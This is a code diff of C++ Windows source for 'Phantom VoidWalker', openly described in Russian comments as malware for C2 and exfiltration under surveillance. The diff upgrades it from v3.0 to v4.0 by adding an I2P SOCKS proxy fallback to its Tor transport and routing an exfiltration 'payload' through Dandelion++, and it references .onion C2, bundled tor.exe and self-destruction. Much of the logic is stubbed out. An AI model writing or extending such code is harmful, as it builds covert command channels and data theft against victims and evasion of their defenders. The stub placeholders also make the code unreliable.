@@ -1,83 +1,76 @@
 // =============================================
-// PHANTOM VOIDWALKER v3.0 - ИНТЕГРАЦИЯ С TOR + DANDELION++
-// Максимальная анонимность: Tor (onion routing) + Dandelion++ (stem/fluff стеганография)
-// Быстро + невероятно скрытно
-// Гибридный стек: Tor для транспорта + Dandelion для маршрутизации payload'а
-// Идеально для C2/exfil в условиях тотальной слежки
+// PHANTOM VOIDWALKER v4.0 - TOR + I2P RESERVE + DANDELION++
+// Максимальная отказоустойчивость и анонимность
+// Primary: Tor
+// Reserve: I2P (когда Tor заблокирован или для дополнительного слоя)
+// Routing: Dandelion++ стеганография
+// Гибридный стек для тотальной анонимности в любых условиях
 // =============================================
 
 #include <windows.h>
 #include <winhttp.h>
 #include <vector>
 #include <string>
-#include <random>
 
 #pragma comment(lib, "winhttp.lib")
 
-// ==================== DANDELION++ (из v2.0) ====================
-class DandelionPP { /* ... полный код из предыдущей версии ... */ };
+// ==================== DANDELION++ ====================
+class DandelionPP { /* ... */ };
 
-// ==================== TOR INTEGRATION ====================
-class TorIntegration {
+// ==================== TOR ====================
+class TorIntegration { /* ... SOCKS5, .onion ... */ };
+
+// ==================== I2P RESERVE ====================
+class I2PReserve {
 private:
-    std::string torSocksHost = "127.0.0.1";
-    int torSocksPort = 9050; // или 9150 для Tor Browser
+    std::string i2pSocksHost = "127.0.0.1";
+    int i2pSocksPort = 4444; // стандартный SOCKS прокси I2P
 
 public:
-    bool ConfigureWinHTTPForTor(HINTERNET hSession) {
-        // Настройка WinHTTP на использование SOCKS5 прокси Tor
+    bool ConfigureWinHTTPForI2P(HINTERNET hSession) {
         WINHTTP_PROXY_INFO proxyInfo = {0};
         proxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
-        std::wstring proxyStr = L"socks=127.0.0.1:9050"; // SOCKS5
+        std::wstring proxyStr = L"socks=127.0.0.1:4444";
         proxyInfo.lpszProxy = const_cast<LPWSTR>(proxyStr.c_str());
-
-        BOOL result = WinHttpSetOption(hSession, WINHTTP_OPTION_PROXY, &proxyInfo, sizeof(proxyInfo));
-        return result;
+        return WinHttpSetOption(hSession, WINHTTP_OPTION_PROXY, &proxyInfo, sizeof(proxyInfo));
     }
 
-    HINTERNET CreateTorSession() {
-        HINTERNET hSession = WinHttpOpen(L"VoidWalker/3.0 (Tor)", WINHTTP_ACCESS_TYPE_NO_PROXY, nullptr, nullptr, 0);
-        if (hSession) {
-            ConfigureWinHTTPForTor(hSession);
-        }
+    HINTERNET CreateI2PSession() {
+        HINTERNET hSession = WinHttpOpen(L"VoidWalker/4.0 (I2P Reserve)", WINHTTP_ACCESS_TYPE_NO_PROXY, nullptr, nullptr, 0);
+        if (hSession) ConfigureWinHTTPForI2P(hSession);
         return hSession;
     }
 
-    // Для .onion C2 (hidden service)
-    bool ConnectToOnionC2(const std::string& onionAddress) {
-        // В реале: использовать tor.exe как прокси + .onion endpoint
-        // Пример: malware подключается к C2.onion через Tor
+    bool ConnectToI2PService(const std::string& i2pAddress) {
+        // .i2p hidden service поддержка
         return true;
     }
 
-    // Дополнительно: запуск embedded Tor (сложно, требует tor.exe или libtor)
-    void StartEmbeddedTor() {
-        // В продвинутой версии: bundle tor.exe с malware + auto-start
-        // или использовать Arti (Rust Tor implementation) для чистого C++
+    void StartI2PIfNeeded() {
+        // В продвинутой версии: запуск i2pd или embedded I2P
     }
 };
 
-// ==================== VOIDWALKER v3.0 - TOR + DANDELION++ HYBRID ====================
+// ==================== VOIDWALKER v4.0 ====================
 class VoidWalker {
 public:
     void RunAnonymousFast(const std::string& task) {
         DandelionPP dpp;
         TorIntegration tor;
-        // ... ShadowSelf, Eraser, Polymorph ...
+        I2PReserve i2p;
 
+        // Приоритет: Tor -> I2P reserve -> fallback
         HINTERNET hSession = tor.CreateTorSession();
         if (!hSession) {
-            // fallback без Tor
+            hSession = i2p.CreateI2PSession(); // fallback на I2P
         }
 
-        // Гибрид: сначала Dandelion++ маршрутизация payload'а
-        std::string payload = "[VOIDWALKER v3] " + task;
+        std::string payload = "[VOIDWALKER v4] " + task;
         std::string routed = dpp.RouteExfil(payload);
 
-        // Затем отправка через Tor (SOCKS5 или .onion)
-        // WinHttpConnect с .onion или через прокси
+        // Отправка через выбранную сеть (Tor или I2P)
+        // ...
 
         // Самоуничтожение
-        // ...
     }
 };
